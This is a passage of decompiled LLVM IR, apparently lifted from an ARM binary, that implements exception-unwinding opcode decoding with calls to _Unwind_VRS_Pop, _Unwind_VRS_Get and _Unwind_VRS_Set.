  %v2_18b94 = inttoptr i32 %v1_18b94 to i32*
  store i32 %v3_18b88, i32* %v2_18b94, align 4
  %v0_18b98 = load i32, i32* %r2.global-to-local, align 4
  %v1_18b98 = load i32, i32* %r3.global-to-local, align 4
  %v4_18b98 = mul i32 %v1_18b98, 4096
  %v5_18b98 = or i32 %v4_18b98, %v0_18b98
  br label %dec_label_pc_18b9c

dec_label_pc_18b9c:                               ; preds = %dec_label_pc_18b4c, %dec_label_pc_18b80
  %storemerge132 = phi i32 [ %v5_18b98, %dec_label_pc_18b80 ], [ 720897, %dec_label_pc_18b4c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18abc

dec_label_pc_18ba4:                               ; preds = %dec_label_pc_18b30
  %v1_18ba4 = and i32 %v0_18814, 252
  store i32 %v1_18ba4, i32* %r3.global-to-local, align 4
  %v7_18ba8 = icmp eq i32 %v1_18ba4, 180
  store i1 %v7_18ba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ba8, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_18ba4
  %v2_18bac = urem i32 %v0_18814, 4
  %v2_18bb4 = add nuw nsw i32 %v2_18bac, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_18bc0 = or i32 %v2_18bb4, 262144
  store i32 %v2_18bc0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18abc

bb157:                                            ; preds = %dec_label_pc_18ba4
  %v2_18bb0 = urem i32 %v0_18b20, 8
  %v2_18bb8 = add nuw nsw i32 %v2_18bb0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_18bc8 = or i32 %v2_18bb8, 524288
  store i32 %v2_18bc8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18abc

dec_label_pc_18bd0:                               ; preds = %dec_label_pc_18ae0
  %v0_18bd0 = load i32, i32* %ip.global-to-local, align 4
  %v7_18bd0 = icmp eq i32 %v0_18bd0, 198
  store i1 %v7_18bd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18bd0, label %dec_label_pc_18bd8, label %dec_label_pc_189dc

dec_label_pc_18bd8:                               ; preds = %dec_label_pc_18bd0
  %v0_18bd8 = load i32, i32* @r5, align 4
  %v1_18bd8 = add i32 %v0_18bd8, 8
  %v2_18bd8 = inttoptr i32 %v1_18bd8 to i8*
  %v3_18bd8 = load i8, i8* %v2_18bd8, align 1
  %v4_18bd8 = zext i8 %v3_18bd8 to i32
  store i32 %v4_18bd8, i32* %r3.global-to-local, align 4
  %v2_18bdc = icmp eq i8 %v3_18bd8, 0
  store i1 %v2_18bdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bdc, label %dec_label_pc_18bec, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_18bd8
  %v2_18be0 = add nsw i32 %v4_18bd8, -1
  store i32 %v2_18be0, i32* %r3.global-to-local, align 4
  %v2_18be4 = trunc i32 %v2_18be0 to i8
  store i8 %v2_18be4, i8* %v2_18bd8, align 1
  %v0_18be8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18be8.pr.pr, label %.thread48.dec_label_pc_18bec_crit_edge, label %dec_label_pc_18c20

.thread48.dec_label_pc_18bec_crit_edge:           ; preds = %.thread48
  %v0_18bec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18bec

dec_label_pc_18bec:                               ; preds = %.thread48.dec_label_pc_18bec_crit_edge, %dec_label_pc_18bd8
  %v2_18c04 = phi i32 [ %v0_18bec.pre, %.thread48.dec_label_pc_18bec_crit_edge ], [ %v0_18bd8, %dec_label_pc_18bd8 ]
  %v1_18bec = add i32 %v2_18c04, 9
  %v2_18bec = inttoptr i32 %v1_18bec to i8*
  %v3_18bec = load i8, i8* %v2_18bec, align 1
  %v4_18bec = zext i8 %v3_18bec to i32
  store i32 %v4_18bec, i32* %r3.global-to-local, align 4
  %v2_18bf0 = icmp eq i8 %v3_18bec, 0
  store i1 %v2_18bf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bf0, label %dec_label_pc_18c3c, label %dec_label_pc_18c00

dec_label_pc_18c00:                               ; preds = %dec_label_pc_18bec
  %v1_18c00 = add nsw i32 %v4_18bec, -1
  store i32 %v1_18c00, i32* %r3.global-to-local, align 4
  %v1_18c04 = trunc i32 %v1_18c00 to i8
  store i8 %v1_18c04, i8* %v2_18bec, align 1
  %v0_18c08 = load i32, i32* @r5, align 4
  %v1_18c08 = add i32 %v0_18c08, 4
  %v2_18c08 = inttoptr i32 %v1_18c08 to i32*
  %v3_18c08 = load i32, i32* %v2_18c08, align 4
  store i32 %v3_18c08, i32* %r2.global-to-local, align 4
  %v1_18c0c = inttoptr i32 %v3_18c08 to i32*
  %v2_18c0c = load i32, i32* %v1_18c0c, align 4
  store i32 %v2_18c0c, i32* %r0.global-to-local, align 4
  %v4_18c0c = add i32 %v3_18c08, 4
  store i32 %v4_18c0c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18c0c, i32* %v2_18c08, align 4
  %v0_18c18 = load i32, i32* %r3.global-to-local, align 4
  %v1_18c18 = trunc i32 %v0_18c18 to i8
  %v2_18c18 = load i32, i32* @r5, align 4
  %v3_18c18 = add i32 %v2_18c18, 8
  %v4_18c18 = inttoptr i32 %v3_18c18 to i8*
  store i8 %v1_18c18, i8* %v4_18c18, align 1
  %v0_18c1c = load i32, i32* %r0.global-to-local, align 4
  %v1_18c1c = load i32, i32* @r5, align 4
  %v2_18c1c = inttoptr i32 %v1_18c1c to i32*
  store i32 %v0_18c1c, i32* %v2_18c1c, align 4
  br label %dec_label_pc_18c20

dec_label_pc_18c20:                               ; preds = %.thread48, %dec_label_pc_18c00
  %v0_18c20 = load i32, i32* %r0.global-to-local, align 4
  %v3_18c20 = udiv i32 %v0_18c20, 16777216
  %v1_18c24 = urem i32 %v3_18c20, 16
  %v3_18c28 = mul i32 %v0_18c20, 256
  store i32 %v3_18c28, i32* %r0.global-to-local, align 4
  %v1_18c2c = add nuw nsw i32 %v1_18c24, 1
  store i32 %v1_18c2c, i32* %r2.global-to-local, align 4
  %v1_18c30 = and i32 %v3_18c20, 240
  store i32 %v1_18c30, i32* %r3.global-to-local, align 4
  %v1_18c34 = load i32, i32* @r5, align 4
  %v2_18c34 = inttoptr i32 %v1_18c34 to i32*
  store i32 %v3_18c28, i32* %v2_18c34, align 4
  %v0_18c38 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c38 = load i32, i32* %r3.global-to-local, align 4
  %v4_18c38 = mul i32 %v1_18c38, 4096
  %v5_18c38 = or i32 %v4_18c38, %v0_18c38
  br label %dec_label_pc_18c3c

dec_label_pc_18c3c:                               ; preds = %dec_label_pc_18bec, %dec_label_pc_18c20
  %storemerge131 = phi i32 [ %v5_18c38, %dec_label_pc_18c20 ], [ 720897, %dec_label_pc_18bec ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18abc

dec_label_pc_18c44:                               ; preds = %dec_label_pc_18a00
  %v0_18c44 = load i32, i32* @r5, align 4
  %v1_18c44 = add i32 %v0_18c44, 8
  %v2_18c44 = inttoptr i32 %v1_18c44 to i8*
  %v3_18c44 = load i8, i8* %v2_18c44, align 1
  %v4_18c44 = zext i8 %v3_18c44 to i32
  store i32 %v4_18c44, i32* %r3.global-to-local, align 4
  %v2_18c48 = icmp eq i8 %v3_18c44, 0
  store i1 %v2_18c48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c48, label %dec_label_pc_18c58, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_18c44
  %v2_18c4c = add nsw i32 %v4_18c44, -1
  store i32 %v2_18c4c, i32* %r3.global-to-local, align 4
  %v2_18c50 = trunc i32 %v2_18c4c to i8
  store i8 %v2_18c50, i8* %v2_18c44, align 1
  %v0_18c54.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18c54.pr.pr, label %.thread52.dec_label_pc_18c58_crit_edge, label %dec_label_pc_18c8c

.thread52.dec_label_pc_18c58_crit_edge:           ; preds = %.thread52
  %v0_18c58.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18c58

dec_label_pc_18c58:                               ; preds = %.thread52.dec_label_pc_18c58_crit_edge, %dec_label_pc_18c44
  %v2_18c70 = phi i32 [ %v0_18c58.pre, %.thread52.dec_label_pc_18c58_crit_edge ], [ %v0_18c44, %dec_label_pc_18c44 ]
  %v1_18c58 = add i32 %v2_18c70, 9
  %v2_18c58 = inttoptr i32 %v1_18c58 to i8*
  %v3_18c58 = load i8, i8* %v2_18c58, align 1
  %v4_18c58 = zext i8 %v3_18c58 to i32
  store i32 %v4_18c58, i32* %r3.global-to-local, align 4
  %v2_18c5c = icmp eq i8 %v3_18c58, 0
  store i1 %v2_18c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c5c, label %dec_label_pc_18ca8, label %dec_label_pc_18c6c

dec_label_pc_18c6c:                               ; preds = %dec_label_pc_18c58
  %v1_18c6c = add nsw i32 %v4_18c58, -1
  store i32 %v1_18c6c, i32* %r3.global-to-local, align 4
  %v1_18c70 = trunc i32 %v1_18c6c to i8
  store i8 %v1_18c70, i8* %v2_18c58, align 1
  %v0_18c74 = load i32, i32* @r5, align 4
  %v1_18c74 = add i32 %v0_18c74, 4
  %v2_18c74 = inttoptr i32 %v1_18c74 to i32*
  %v3_18c74 = load i32, i32* %v2_18c74, align 4
  store i32 %v3_18c74, i32* %r2.global-to-local, align 4
  %v1_18c78 = inttoptr i32 %v3_18c74 to i32*
  %v2_18c78 = load i32, i32* %v1_18c78, align 4
  store i32 %v2_18c78, i32* %r0.global-to-local, align 4
  %v4_18c78 = add i32 %v3_18c74, 4
  store i32 %v4_18c78, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18c78, i32* %v2_18c74, align 4
  %v0_18c84 = load i32, i32* %r3.global-to-local, align 4
  %v1_18c84 = trunc i32 %v0_18c84 to i8
  %v2_18c84 = load i32, i32* @r5, align 4
  %v3_18c84 = add i32 %v2_18c84, 8
  %v4_18c84 = inttoptr i32 %v3_18c84 to i8*
  store i8 %v1_18c84, i8* %v4_18c84, align 1
  %v0_18c88 = load i32, i32* %r0.global-to-local, align 4
  %v1_18c88 = load i32, i32* @r5, align 4
  %v2_18c88 = inttoptr i32 %v1_18c88 to i32*
  store i32 %v0_18c88, i32* %v2_18c88, align 4
  br label %dec_label_pc_18c8c

dec_label_pc_18c8c:                               ; preds = %.thread52, %dec_label_pc_18c6c
  %v0_18c8c = load i32, i32* %r0.global-to-local, align 4
  %v3_18c8c = udiv i32 %v0_18c8c, 16777216
  %v1_18c90 = urem i32 %v3_18c8c, 16
  %v3_18c94 = mul i32 %v0_18c8c, 256
  store i32 %v3_18c94, i32* %r0.global-to-local, align 4
  %v1_18c98 = add nuw nsw i32 %v1_18c90, 1
  store i32 %v1_18c98, i32* %r2.global-to-local, align 4
  %v1_18c9c = and i32 %v3_18c8c, 240
  store i32 %v1_18c9c, i32* %r3.global-to-local, align 4
  %v1_18ca0 = load i32, i32* @r5, align 4
  %v2_18ca0 = inttoptr i32 %v1_18ca0 to i32*
  store i32 %v3_18c94, i32* %v2_18ca0, align 4
  %v0_18ca4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18ca4 = load i32, i32* %r3.global-to-local, align 4
  %v4_18ca4 = mul i32 %v1_18ca4, 4096
  %v5_18ca4 = or i32 %v4_18ca4, %v0_18ca4
  br label %dec_label_pc_18ca8

dec_label_pc_18ca8:                               ; preds = %dec_label_pc_18c58, %dec_label_pc_18c8c
  %storemerge130 = phi i32 [ %v5_18ca4, %dec_label_pc_18c8c ], [ 720897, %dec_label_pc_18c58 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18abc

dec_label_pc_18cb0:                               ; preds = %dec_label_pc_189dc
  %v0_18cb0 = load i32, i32* @r5, align 4
  %v1_18cb0 = add i32 %v0_18cb0, 8
  %v2_18cb0 = inttoptr i32 %v1_18cb0 to i8*
  %v3_18cb0 = load i8, i8* %v2_18cb0, align 1
  %v4_18cb0 = zext i8 %v3_18cb0 to i32
  store i32 %v4_18cb0, i32* %r3.global-to-local, align 4
  %v2_18cb4 = icmp eq i8 %v3_18cb0, 0
  store i1 %v2_18cb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18cb4, label %dec_label_pc_18e5c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_18cb0
  %v2_18cb8 = add nsw i32 %v4_18cb0, -1
  store i32 %v2_18cb8, i32* %r3.global-to-local, align 4
  %v2_18cbc = trunc i32 %v2_18cb8 to i8
  store i8 %v2_18cbc, i8* %v2_18cb0, align 1
  %v0_18cc0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18cc0.pr.pr, label %.thread56.dec_label_pc_18e5c_crit_edge, label %dec_label_pc_18cc4

.thread56.dec_label_pc_18e5c_crit_edge:           ; preds = %.thread56
  %v0_18e5c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e5c

dec_label_pc_18cc4:                               ; preds = %.thread56, %dec_label_pc_18e68
  %v0_18cc4 = load i32, i32* %r0.global-to-local, align 4
  %v3_18cc4 = udiv i32 %v0_18cc4, 16777216
  store i32 %v3_18cc4, i32* %r3.global-to-local, align 4
  store i32 %v3_18cc4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_18cc4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_18ccc = mul i32 %v0_18cc4, 256
  store i32 %v3_18ccc, i32* %r0.global-to-local, align 4
  %v1_18cd0 = load i32, i32* @r5, align 4
  %v2_18cd0 = inttoptr i32 %v1_18cd0 to i32*
  store i32 %v3_18ccc, i32* %v2_18cd0, align 4
  br i1 %tmp184, label %dec_label_pc_18a8c, label %dec_label_pc_18cd8

dec_label_pc_18cd8:                               ; preds = %dec_label_pc_18cc4
  %v0_18cd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_18cd8 = and i32 %v0_18cd8, 240
  store i32 %v1_18cd8, i32* %r3.global-to-local, align 4
  %v2_18cd8 = icmp eq i32 %v1_18cd8, 0
  store i1 %v2_18cd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18cd8, label %dec_label_pc_18ce0, label %dec_label_pc_18a8c

dec_label_pc_18ce0:                               ; preds = %dec_label_pc_18cd8
  %v0_18ce0 = load i32, i32* @r7, align 4
  store i32 %v0_18ce0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_18ce8 = load i32, i32* %r2.global-to-local, align 4
  %v4_18ce8 = call i32 @_Unwind_VRS_Pop(i32 %v0_18ce0, i32 4, i32 %v2_18ce8, i32 0)
  store i32 %v4_18ce8, i32* %r0.global-to-local, align 4
  %v2_18cec = icmp eq i32 %v4_18ce8, 0
  store i1 %v2_18cec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18cec, label %dec_label_pc_187bc.backedge, label %dec_label_pc_18cf4

dec_label_pc_18cf4:                               ; preds = %dec_label_pc_18ce0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_188e4

dec_label_pc_18cfc:                               ; preds = %dec_label_pc_18b28
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18d08 = load i32, i32* @r7, align 4
  store i32 %v0_18d08, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_18d14 = call i32 @_Unwind_VRS_Get(i32 %v0_18d08, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18d14, i32* %r0.global-to-local, align 4
  %v0_18d18 = load i32, i32* @r5, align 4
  %v1_18d18 = add i32 %v0_18d18, 8
  %v2_18d18 = inttoptr i32 %v1_18d18 to i8*
  %v3_18d18 = load i8, i8* %v2_18d18, align 1
  %v4_18d18 = zext i8 %v3_18d18 to i32
  store i32 %v4_18d18, i32* %r1.global-to-local, align 4
  %v2_18d1c = icmp eq i8 %v3_18d18, 0
  store i1 %v2_18d1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d1c, label %dec_label_pc_18d2c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_18cfc
  %v2_18d20 = add nsw i32 %v4_18d18, -1
  store i32 %v2_18d20, i32* %r3.global-to-local, align 4
  %v2_18d24 = trunc i32 %v2_18d20 to i8
  store i8 %v2_18d24, i8* %v2_18d18, align 1
  %v0_18d28.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d28.pr.pr, label %.thread58.dec_label_pc_18d2c_crit_edge, label %dec_label_pc_18d58

.thread58.dec_label_pc_18d2c_crit_edge:           ; preds = %.thread58
  %v0_18d2c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18d2c

dec_label_pc_18d2c:                               ; preds = %.thread58.dec_label_pc_18d2c_crit_edge, %dec_label_pc_18cfc
  %v2_18d40 = phi i32 [ %v0_18d2c.pre, %.thread58.dec_label_pc_18d2c_crit_edge ], [ %v0_18d18, %dec_label_pc_18cfc ]
  %v1_18d2c = add i32 %v2_18d40, 9
  %v2_18d2c = inttoptr i32 %v1_18d2c to i8*
  %v3_18d2c = load i8, i8* %v2_18d2c, align 1
  %v4_18d2c = zext i8 %v3_18d2c to i32
  store i32 %v4_18d2c, i32* %r3.global-to-local, align 4
  %v2_18d30 = icmp eq i8 %v3_18d2c, 0
  store i1 %v2_18d30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d30, label %bb158, label %dec_label_pc_18d3c

bb158:                                            ; preds = %dec_label_pc_18d2c
  %v1_18d34 = load i32, i32* @r6, align 4
  store i32 %v1_18d34, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d80

dec_label_pc_18d3c:                               ; preds = %dec_label_pc_18d2c
  %v1_18d3c = add nsw i32 %v4_18d2c, -1
  store i32 %v1_18d3c, i32* %r3.global-to-local, align 4
  %v1_18d40 = trunc i32 %v1_18d3c to i8
  store i8 %v1_18d40, i8* %v2_18d2c, align 1
  %v0_18d44 = load i32, i32* @r5, align 4
  %v1_18d44 = add i32 %v0_18d44, 4
  %v2_18d44 = inttoptr i32 %v1_18d44 to i32*
  %v3_18d44 = load i32, i32* %v2_18d44, align 4
  store i32 %v3_18d44, i32* %r2.global-to-local, align 4
  %v1_18d48 = inttoptr i32 %v3_18d44 to i32*
  %v2_18d48 = load i32, i32* %v1_18d48, align 4
  store i32 %v2_18d48, i32* %r0.global-to-local, align 4
  %v4_18d48 = add i32 %v3_18d44, 4
  store i32 %v4_18d48, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18d50 = inttoptr i32 %v0_18d44 to i32*
  store i32 %v2_18d48, i32* %v1_18d50, align 4
  %v5_18d50 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18d50, i32* %v2_18d44, align 4
  %v0_18d54 = load i32, i32* %r3.global-to-local, align 4
  %v1_18d54 = trunc i32 %v0_18d54 to i8
  %v2_18d54 = load i32, i32* @r5, align 4
  %v3_18d54 = add i32 %v2_18d54, 8
  %v4_18d54 = inttoptr i32 %v3_18d54 to i8*
  store i8 %v1_18d54, i8* %v4_18d54, align 1
  br label %dec_label_pc_18d58

dec_label_pc_18d58:                               ; preds = %.thread58, %dec_label_pc_18d3c
  %v0_18d58 = load i32, i32* @r5, align 4
  %v1_18d58 = inttoptr i32 %v0_18d58 to i32*
  %v2_18d58 = load i32, i32* %v1_18d58, align 4
  store i32 %v2_18d58, i32* %r3.global-to-local, align 4
  %v3_18d5c = mul i32 %v2_18d58, 256
  store i32 %v3_18d5c, i32* %r0.global-to-local, align 4
  %v3_18d60 = udiv i32 %v2_18d58, 16777216
  store i32 %v3_18d60, i32* %r2.global-to-local, align 4
  store i32 %v3_18d5c, i32* %v1_18d58, align 4
  %v0_18d68 = load i32, i32* %r2.global-to-local, align 4
  %v1_18d68 = and i32 %v0_18d68, 128
  %v2_18d68 = icmp eq i32 %v1_18d68, 0
  store i1 %v2_18d68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d68, label %.thread129, label %dec_label_pc_18d7c

.thread129:                                       ; preds = %dec_label_pc_18d58
  %v4_18d6c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_18d6c, i32* %ip.global-to-local, align 4
  %v1_18d70 = urem i32 %v0_18d68, 256
  store i32 %v1_18d70, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_18df0

dec_label_pc_18d7c:                               ; preds = %dec_label_pc_18d58
  %v1_18d7063 = urem i32 %v0_18d68, 256
  store i32 %v1_18d7063, i32* %r2.global-to-local, align 4
  %v0_18d7c = load i32, i32* @r5, align 4
  %v1_18d7c = add i32 %v0_18d7c, 8
  %v2_18d7c = inttoptr i32 %v1_18d7c to i8*
  %v3_18d7c = load i8, i8* %v2_18d7c, align 1
  %v4_18d7c = zext i8 %v3_18d7c to i32
  store i32 %v4_18d7c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18d80

dec_label_pc_18d80:                               ; preds = %bb158, %dec_label_pc_18d7c
  %v3_18da099 = phi i32 [ %v2_18d40, %bb158 ], [ %v0_18d7c, %dec_label_pc_18d7c ]
  %v0_18d8892 = phi i32 [ %v1_18d34, %bb158 ], [ %v1_18d7063, %dec_label_pc_18d7c ]
  %v3_18d80 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_18d80, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18d88

dec_label_pc_18d88:                               ; preds = %dec_label_pc_18d88.backedge, %dec_label_pc_18d80
  %v3_18da0 = phi i32 [ %v3_18da0100, %dec_label_pc_18d88.backedge ], [ %v3_18da099, %dec_label_pc_18d80 ]
  %v0_18d9c = phi i32 [ %v2_18d8c.pre, %dec_label_pc_18d88.backedge ], [ 2, %dec_label_pc_18d80 ]
  %v0_18d8c = phi i32 [ %v0_18d8c.pre, %dec_label_pc_18d88.backedge ], [ %v3_18d80, %dec_label_pc_18d80 ]
  %v0_18d88 = phi i32 [ %v0_18d8895, %dec_label_pc_18d88.backedge ], [ %v0_18d8892, %dec_label_pc_18d80 ]
  %v1_18d88 = urem i32 %v0_18d88, 128
  %v7_18d8c = shl i32 %v1_18d88, %v0_18d9c
  %v8_18d8c = add i32 %v7_18d8c, %v0_18d8c
  store i32 %v8_18d8c, i32* %ip.global-to-local, align 4
  %v0_18d90 = load i32, i32* %r1.global-to-local, align 4
  %v2_18d90 = icmp eq i32 %v0_18d90, 0
  store i1 %v2_18d90, i1* %cpsr_z.global-to-local, align 1
  %v1_18d94 = add i32 %v0_18d90, -1
  store i32 %v1_18d94, i32* %r3.global-to-local, align 4
  store i32 %v8_18d8c, i32* %stack_var_-36, align 4
  %v1_18d9c = add i32 %v0_18d9c, 7
  store i32 %v1_18d9c, i32* @lr, align 4
  br i1 %v2_18d90, label %dec_label_pc_18da8, label %bb159

bb159:                                            ; preds = %dec_label_pc_18d88
  %v2_18da0 = trunc i32 %v1_18d94 to i8
  %v4_18da0 = add i32 %v3_18da0, 8
  %v5_18da0 = inttoptr i32 %v4_18da0 to i8*
  store i8 %v2_18da0, i8* %v5_18da0, align 1
  %v0_18da4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18da4.pr, label %.dec_label_pc_18da8_crit_edge, label %dec_label_pc_18dd4

.dec_label_pc_18da8_crit_edge:                    ; preds = %bb159
  %v0_18da8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18da8

dec_label_pc_18da8:                               ; preds = %.dec_label_pc_18da8_crit_edge, %dec_label_pc_18d88
  %v2_18dc0 = phi i32 [ %v0_18da8.pre, %.dec_label_pc_18da8_crit_edge ], [ %v3_18da0, %dec_label_pc_18d88 ]
  %v1_18da8 = add i32 %v2_18dc0, 9
  %v2_18da8 = inttoptr i32 %v1_18da8 to i8*
  %v3_18da8 = load i8, i8* %v2_18da8, align 1
  %v4_18da8 = zext i8 %v3_18da8 to i32
  store i32 %v4_18da8, i32* %r3.global-to-local, align 4
  %v2_18dac = icmp eq i8 %v3_18da8, 0
  store i1 %v2_18dac, i1* %cpsr_z.global-to-local, align 1
  %v1_18db0 = add nsw i32 %v4_18da8, -1
  store i32 %v1_18db0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_18dac, label %dec_label_pc_18d88.backedge, label %dec_label_pc_18dbc

dec_label_pc_18dbc:                               ; preds = %dec_label_pc_18da8
  %v1_18dbc = add i32 %v2_18dc0, 4
  %v2_18dbc = inttoptr i32 %v1_18dbc to i32*
  %v3_18dbc = load i32, i32* %v2_18dbc, align 4
  store i32 %v3_18dbc, i32* %r2.global-to-local, align 4
  %v1_18dc0 = trunc i32 %v1_18db0 to i8
  store i8 %v1_18dc0, i8* %v2_18da8, align 1
  %v0_18dc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18dc4 = inttoptr i32 %v0_18dc4 to i32*
  %v2_18dc4 = load i32, i32* %v1_18dc4, align 4
  store i32 %v2_18dc4, i32* %r0.global-to-local, align 4
  %v4_18dc4 = add i32 %v0_18dc4, 4
  store i32 %v4_18dc4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_18dcc = load i32, i32* @r5, align 4
  %v3_18dcc = add i32 %v2_18dcc, 8
  %v4_18dcc = inttoptr i32 %v3_18dcc to i8*
  store i8 3, i8* %v4_18dcc, align 1
  %v0_18dd0 = load i32, i32* @r5, align 4
  %v1_18dd0 = inttoptr i32 %v0_18dd0 to i32*
  %v2_18dd0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_18dd0, i32* %v1_18dd0, align 4
  %v3_18dd0 = add i32 %v0_18dd0, 4
  %v4_18dd0 = inttoptr i32 %v3_18dd0 to i32*
  %v5_18dd0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18dd0, i32* %v4_18dd0, align 4
  br label %dec_label_pc_18dd4

dec_label_pc_18dd4:                               ; preds = %bb159, %dec_label_pc_18dbc
  %v0_18dd4 = load i32, i32* @r5, align 4
  %v1_18dd4 = inttoptr i32 %v0_18dd4 to i32*
  %v2_18dd4 = load i32, i32* %v1_18dd4, align 4
  store i32 %v2_18dd4, i32* %r3.global-to-local, align 4
  %v3_18dd8 = udiv i32 %v2_18dd4, 16777216
  store i32 %v3_18dd8, i32* %r2.global-to-local, align 4
  %v1_18ddc = and i32 %v3_18dd8, 128
  %v2_18ddc = icmp eq i32 %v1_18ddc, 0
  store i1 %v2_18ddc, i1* %cpsr_z.global-to-local, align 1
  %v3_18de0 = mul i32 %v2_18dd4, 256
  store i32 %v3_18de0, i32* %r0.global-to-local, align 4
  store i32 %v3_18de0, i32* %v1_18dd4, align 4
  %v0_18de8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18de8 = urem i32 %v0_18de8, 256
  store i32 %v1_18de8, i32* %r2.global-to-local, align 4
  br i1 %v2_18ddc, label %dec_label_pc_18df0.loopexit, label %dec_label_pc_18e1c

dec_label_pc_18df0.loopexit:                      ; preds = %dec_label_pc_18dd4
  %v0_18df4.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_18df8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_18df0

dec_label_pc_18df0:                               ; preds = %dec_label_pc_18df0.loopexit, %.thread129
  %v2_18df8 = phi i32 [ 2, %.thread129 ], [ %v2_18df8.pre, %dec_label_pc_18df0.loopexit ]
  %v0_18df4 = phi i32 [ %v4_18d6c, %.thread129 ], [ %v0_18df4.pre, %dec_label_pc_18df0.loopexit ]
  %v0_18df0 = phi i32 [ %v1_18d70, %.thread129 ], [ %v1_18de8, %dec_label_pc_18df0.loopexit ]
  %v1_18df0 = urem i32 %v0_18df0, 128
  %v1_18df4 = add i32 %v0_18df4, 516
  %v7_18df8 = shl i32 %v1_18df0, %v2_18df8
  %v8_18df8 = add i32 %v1_18df4, %v7_18df8
  store i32 %v8_18df8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18e00 = load i32, i32* @r7, align 4
  store i32 %v0_18e00, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_18df8, i32* %stack_var_-36, align 4
  %v5_18e14 = call i32 @_Unwind_VRS_Set(i32 %v0_18e00, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18e14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_187bc.backedge

dec_label_pc_18e1c:                               ; preds = %dec_label_pc_18dd4
  %v0_18e1c = load i32, i32* @r5, align 4
  %v1_18e1c = add i32 %v0_18e1c, 8
  %v2_18e1c = inttoptr i32 %v1_18e1c to i8*
  %v3_18e1c = load i8, i8* %v2_18e1c, align 1
  %v4_18e1c = zext i8 %v3_18e1c to i32
  store i32 %v4_18e1c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18d88.backedge

dec_label_pc_18d88.backedge:                      ; preds = %dec_label_pc_18e1c, %dec_label_pc_18da8
  %v3_18da0100 = phi i32 [ %v0_18e1c, %dec_label_pc_18e1c ], [ %v2_18dc0, %dec_label_pc_18da8 ]
